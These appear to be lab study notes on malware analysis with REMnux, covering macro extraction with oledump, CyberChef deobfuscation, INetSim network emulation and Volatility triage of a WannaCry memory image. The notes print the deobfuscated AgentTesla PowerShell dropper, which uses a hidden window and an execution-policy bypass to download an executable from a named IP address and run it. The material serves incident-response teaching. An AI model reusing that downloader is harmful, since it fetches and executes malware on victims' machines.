# REMnux: Getting Started

## Environment & purpose

- Lab: **REMnux VM** (preinstalled malware analysis tools: Volatility, YARA, Wireshark, oledump, INetSim, CyberChef, etc.).
- Goal: demonstrate **static** (OLE/VBA), **dynamic** (fake network), and **memory** (Volatility) preprocessing for incident response.

## Static file analysis (OLE / VBA)

- Tool: `oledump.py`. Target: `agenttesla.xlsm` (OLE2 / OOXML with `xl/vbaProject.bin`).
- Key output: data streams listing (example):
    - `A: xl/vbaProject.bin`
    - `A4: M 688 'VBA/ThisWorkbook'` → **M** = macro present.
- Inspect specific stream:
    
    `oledump.py agenttesla.xlsm -s 4 --vbadecompress`
    
    - `-vbadecompress` decompresses compressed VBA automatically.
- Found VBA snippet:
    - `Sqtnew` contains obfuscated PowerShell command with junk characters  and `^`.
    - Deobfuscation performed by: `Sqtnew = Replace(Sqtnew, "*", "")` and `Sqtnew = Replace(Sqtnew, "^", "")`.
- Final deobfuscated command (PowerShell):
    
    ```
    powershell -WindowStyle hidden -executionpolicy bypass;
    $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru;
    Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
    Start-Process $TempFile;
    ```
    
- Interpretation: macro downloads `Doc-3737122pdf.exe` from IP `193.203.203.67`, saves to temp as `.exe`, then executes it (common downloader/dropper behavior).

## Deobfuscation workflow used

- Extract VBA stream with `oledump.py -s <index> --vbadecompress`.
- Copy obfuscated string into **CyberChef**; use two **Find/Replace** steps to remove  and `^` (replace with empty string) to reveal PowerShell payload.
- Key takeaway: macros often use simple character obfuscation — CyberChef or scriptable string replacers are quick fixes.

## Dynamic analysis — simulated network with INetSim

- Tool: **INetSim** (Internet Services Simulation Suite) inside REMnux to emulate DNS/HTTP/HTTPS/etc.
- Config change: set `dns_default_ip` in `/etc/inetsim/inetsim.conf` to REMnux IP (uncomment & set to machine IP).
    - Verify: `cat /etc/inetsim/inetsim.conf | grep dns_default_ip`
- Start: `sudo inetsim` → ensure `Simulation running`.
- From AttackBox VM: simulate malware fetching payload(s):
    - `sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate`
    - `sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate`
- INetSim logs & report saved in `/var/log/inetsim/report/` (e.g. `report.XXXX.txt`) — contains captured requests and filenames (helpful for IOC listing and timeline).
- Benefits: safely observe download behavior and capture fake payloads without Internet.

## Memory preprocessing & bulk collection (Volatility 3)

- Image: `wcry.mem` (example).
- Tool: `vol3` (Volatility 3). Recommended plugins (Windows-focused examples used):
    - `windows.pstree.PsTree` — process tree.
    - `windows.pslist.PsList` — process list.
    - `windows.cmdline.CmdLine` — process command-lines.
    - `windows.filescan.FileScan` — file object scan.
    - `windows.dlllist.DllList` — loaded modules per process.
    - `windows.malfind.Malfind` — likely injected code regions.
    - `windows.psscan.PsScan` — scan-for-process-structures (unlinked/terminated).
- Bulk-export pattern (loop):
    
    ```bash
    for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree \
                  windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan \
                  windows.dlllist.DllList; do
        vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
    done
    ```
    
    - Produces per-plugin text outputs for faster triage/search.
- Strings extraction (preprocessing):
    
    ```bash
    strings wcry.mem > wcry.strings.ascii.txt
    strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
    strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
    
    ```
    
    - Extract ASCII + little/big-endian Unicode strings for keyword search/IOC hunting.

## Observations from sample outputs

- Volatility outputs showed known ransomware artifacts (`@WanaDecryptor@`, various `.wnry` files), multiple suspicious processes/executables, and temporary binary blobs — demonstrates how memory contains dropped/active artifacts.
- `windows.cmdline.CmdLine` yields actionable command-line IOCs (e.g. custom `tasksche.exe` paths, `@WanaDecryptor@.exe`).

## Practical next steps / quick checklist

- Capture and preserve: `agenttesla.xlsm`, extracted `vbaProject.bin`, deobfuscated PowerShell string, INetSim reports, downloaded fake payload files, and `wcry.*.txt` outputs.
- Generate IOCs from static + dynamic: download URL (`http://193.203.203.67/rt/Doc-3737122pdf.exe`), filenames (`Doc-3737122pdf.exe`, `second_payload.*`), IP addresses, process names, and registry/startup entries seen in memory.
- YARA / signatures: create quick YARA or YQL rules for the PowerShell pattern or macro indicators (e.g., `executionpolicy bypass`, `GetTempFileName() | Rename-Item -replace 'tmp$','exe'`).
- Sandbox execution (isolated): if you want behavioral artifacts beyond INetSim, run the sample in a fully isolated sandbox (snapshots + controlled outbound capture).
- Memory triage: prioritize `windows.cmdline.CmdLine`, `malfind`, `filescan` outputs for forensic evidence of dropper/execution.

## Summary (one-liner)

Extract macros with `oledump.py --vbadecompress`, deobfuscate strings (CyberChef or scripted replace), emulate network with INetSim to capture downloads, and bulk-preprocess memory with Volatility3 + `strings` to produce text artifacts and IOCs for faster triage.
